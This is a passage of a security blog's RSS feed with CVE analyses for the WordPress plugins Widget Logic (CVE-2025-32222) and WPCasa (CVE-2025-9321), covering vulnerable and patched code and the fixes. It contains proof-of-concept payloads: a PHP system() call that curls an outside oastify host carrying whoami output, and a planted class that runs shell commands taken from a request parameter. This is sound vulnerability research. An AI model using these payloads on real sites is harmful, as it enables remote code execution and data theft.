aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in as a &lt;strong&gt;Contributor&lt;/strong&gt; user&lt;/li&gt;&#xA;&lt;li&gt;Create a post, add any block, and add the payload in &lt;strong&gt;Widget Logic&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;system(&amp;#39;curl http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#39; alt=&#34;Result&#34; height=&#34;582&#34; width=&#34;1131&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE‑2025‑32222 stems from the &lt;strong&gt;use of &lt;code&gt;eval()&lt;/code&gt; on user-controlled data&lt;/strong&gt; in &lt;code&gt;widget_logic_check_logic()&lt;/code&gt;. With only &lt;strong&gt;Contributor&lt;/strong&gt; privileges, an attacker can inject malicious logic into the &lt;code&gt;widgetLogic&lt;/code&gt; attribute of a block, causing arbitrary PHP code to be executed during the &lt;code&gt;render_block&lt;/code&gt; process. The automatic wrapping with &lt;code&gt;return(...)&lt;/code&gt; makes exploitation even easier, as any input ultimately becomes valid PHP code. Version 6.0.6 fully addresses this by removing &lt;code&gt;eval()&lt;/code&gt; and introducing a &lt;strong&gt;tokenize + parse + allowlist&lt;/strong&gt; mechanism, effectively blocking arbitrary code execution.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never use &lt;code&gt;eval()&lt;/code&gt; on user-supplied data, even if the user has lower privileges than an admin.&lt;/li&gt;&#xA;&lt;li&gt;Logical expressions should be processed using a &lt;strong&gt;dedicated parser + function whitelist&lt;/strong&gt;, not by direct execution.&lt;/li&gt;&#xA;&lt;li&gt;Data attached to blocks (block attributes) is still &lt;strong&gt;user input&lt;/strong&gt; and must be strictly controlled.&lt;/li&gt;&#xA;&lt;li&gt;Even the &lt;strong&gt;Contributor&lt;/strong&gt; role can lead to &lt;strong&gt;critical RCE&lt;/strong&gt; if input handling is flawed.&lt;/li&gt;&#xA;&lt;li&gt;Replacing &lt;code&gt;eval()&lt;/code&gt; with a safe parsing approach is the correct direction for plugins that process “user logic”.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-logic/vulnerability/wordpress-widget-logic-6-0-5-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin &amp;lt;= 6.0.5 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9321 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-28-cve-2025-9321/</link>
      <pubDate>Fri, 28 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-28-cve-2025-9321/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WPCasa WordPress plugin is vulnerable to Code Injection in all versions up to and including 1.4.1. The root cause is insufficient validation and restriction of input within the &lt;code&gt;&#39;api_requests&#39;&lt;/code&gt; function. This allows an unauthenticated attacker to invoke arbitrary functions and execute code.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9321&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9321&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wpcasa/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WPCasa&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.4.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.4.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function api_requests() {&#xA;    global $wp;&#xA;&#xA;    if ( ! empty( $_GET[&amp;#39;wpsight-api&amp;#39;] ) )&#xA;        $wp-&amp;gt;query_vars[&amp;#39;wc-api&amp;#39;] = sanitize_text_field( $_GET[&amp;#39;wpsight-api&amp;#39;] );&#xA;&#xA;    if ( ! empty( $wp-&amp;gt;query_vars[&amp;#39;wc-api&amp;#39;] ) ) {&#xA;        // Buffer, we won&amp;#39;t want any output here&#xA;        ob_start();&#xA;&#xA;        // Get API trigger&#xA;        $api = strtolower( esc_attr( $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;] ) );&#xA;&#xA;        // Load class if exists&#xA;        if ( class_exists( $api ) )&#xA;            $api_class = new $api();&#xA;&#xA;        // Trigger actions&#xA;        do_action( &amp;#39;wpsight_api_&amp;#39; . $api );&#xA;&#xA;        // Done, clear buffer and exit&#xA;        ob_end_clean();&#xA;        die(&amp;#39;1&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function reads the &lt;code&gt;wpsight-api&lt;/code&gt; parameter from the URL, uses it to instantiate a class if it exists, triggers the associated &lt;code&gt;do_action&lt;/code&gt; hook, and finally terminates with &lt;code&gt;die(&#39;1&#39;)&lt;/code&gt;. The issue is that the URL-supplied data is not tightly controlled, making it easy to exploit for code execution.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v1.4.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function api_requests() {&#xA;    global $wp;&#xA;&#xA;    // 1) Preferred getter.&#xA;    $raw = get_query_var( &amp;#39;wpsight-api&amp;#39; );&#xA;&#xA;    // 2) Fallback: directly from $wp-&amp;gt;query_vars.&#xA;    if ( empty( $raw ) &amp;amp;&amp;amp; isset( $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;] ) ) {&#xA;        $raw = $wp-&amp;gt;query_vars[&amp;#39;wpsight-api&amp;#39;];&#xA;    }&#xA;&#xA;    // 3) Last resort: direct $_GET.&#xA;    if ( empty( $raw ) &amp;amp;&amp;amp; ! empty( $_GET[&amp;#39;wpsight-api&amp;#39;] ) ) {&#xA;        $raw = sanitize_text_field( wp_unslash( $_GET[&amp;#39;wpsight-api&amp;#39;] ) );&#xA;    }&#xA;&#xA;    // No request found → exit early.&#xA;    if ( empty( $raw ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Sanitize to a valid key.&#xA;    $api = sanitize_key( $raw );&#xA;&#xA;    if ( empty( $api ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    /**&#xA;        * Build allow-list of allowed API endpoints.&#xA;        */&#xA;    $allowed = apply_filters(&#xA;        &amp;#39;wpsight_api_allowed_endpoints&amp;#39;,&#xA;        array()&#xA;    );&#xA;&#xA;    // If API is not allowed, block access.&#xA;    if ( ! isset( $allowed[ $api ] ) ) {&#xA;        wp_die(&#xA;            sprintf(&#xA;                esc_html__( &amp;#39;Endpoint &amp;#34;%s&amp;#34; not allowed.&amp;#39;, &amp;#39;wpcasa&amp;#39; ),&#xA;                $api&#xA;            ),&#xA;            esc_html__( &amp;#39;Forbidden&amp;#39;, &amp;#39;wpcasa&amp;#39; ),&#xA;            array( &amp;#39;response&amp;#39; =&amp;gt; 403 )&#xA;        );&#xA;    }&#xA;&#xA;    // Start output buffering.&#xA;    ob_start();&#xA;&#xA;    // Optional: safe class instantiation if explicitly allowed.&#xA;    if ( ! empty( $allowed[ $api ][&amp;#39;class&amp;#39;] ) &amp;amp;&amp;amp; class_exists( $allowed[ $api ][&amp;#39;class&amp;#39;] ) ) {&#xA;        new $allowed[ $api ][&amp;#39;class&amp;#39;]();&#xA;    }&#xA;&#xA;    /**&#xA;        * Trigger API action hook.&#xA;        */&#xA;    do_action( &amp;#39;wpsight_api_&amp;#39; . $api );&#xA;&#xA;    if ( defined( &amp;#39;WP_DEBUG&amp;#39; ) &amp;amp;&amp;amp; WP_DEBUG ) {&#xA;        ob_end_flush();&#xA;    } else {&#xA;        ob_end_clean();&#xA;    }&#xA;&#xA;    die( &amp;#39;1&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#39; alt=&#34;Diff&#34; height=&#34;975&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Reads input with layered fallbacks: &lt;code&gt;get_query_var&lt;/code&gt; → &lt;code&gt;$wp-&amp;gt;query_vars&lt;/code&gt; → &lt;code&gt;$_GET&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;sanitize_key&lt;/code&gt; for strict input control.&lt;/li&gt;&#xA;&lt;li&gt;Enforces an allow‑list using &lt;code&gt;wpsight_api_allowed_endpoints&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Blocks all endpoints not explicitly allowed (403).&lt;/li&gt;&#xA;&lt;li&gt;Only instantiates classes if clearly defined in the allow-list.&lt;/li&gt;&#xA;&lt;li&gt;Improves safety and prevents unauthorized code execution.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers this action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;parse_request&amp;#39;, array( $this, &amp;#39;api_requests&amp;#39;), 0 );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;parse_request&lt;/code&gt;: This hook fires very early, right after WordPress parses the URL and populates &lt;code&gt;$wp&lt;/code&gt;. It is responsible for processing query variables, meaning the &lt;code&gt;api_requests&lt;/code&gt; callback executes immediately when processing the request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Attacker sends request /?wpsight-api=payload&amp;#34;] --&amp;gt; B[&amp;#34;parse_request hook triggers api_requests()&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Read user input $_GET[&amp;#39;wpsight-api&amp;#39;]&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$api = strtolower(esc_attr(...))&amp;#34;]&#xA;&#xA;D --&amp;gt; E{&amp;#34;class_exists($api)?&amp;#34;}&#xA;E -- Yes --&amp;gt; F[&amp;#34;Instantiate arbitrary class new $api() → constructor executes&amp;#34;]&#xA;E -- No --&amp;gt; G[&amp;#34;Skip class creation&amp;#34;]&#xA;&#xA;F --&amp;gt; H[&amp;#34;Trigger dynamic hook do_action(&amp;#39;wpsight_api_&amp;#39; . $api)&amp;#34;]&#xA;G --&amp;gt; H&#xA;&#xA;H --&amp;gt; I{&amp;#34;Hook handler exists?&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;Callback executed → attacker-controlled code&amp;#34;]&#xA;I -- No --&amp;gt; K[&amp;#34;No action, but die(&amp;#39;1&amp;#39;) still called&amp;#34;]&#xA;&#xA;J --&amp;gt; L[&amp;#34;RCE achieved&amp;#34;]&#xA;K --&amp;gt; L&#xA;&#xA;L --&amp;gt; Z[&amp;#34;End&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create an evil class in wp-config.php for testing:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;&#x9;public function __construct() {&#xA;&#x9;&#x9;$this-&amp;gt;command = isset($_REQUEST[&amp;#39;cmd&amp;#39;]) ? $_REQUEST[&amp;#39;cmd&amp;#39;] : $this-&amp;gt;command;&#xA;&#x9;&#x9;die(system($this-&amp;gt;command));&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send a request with payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET 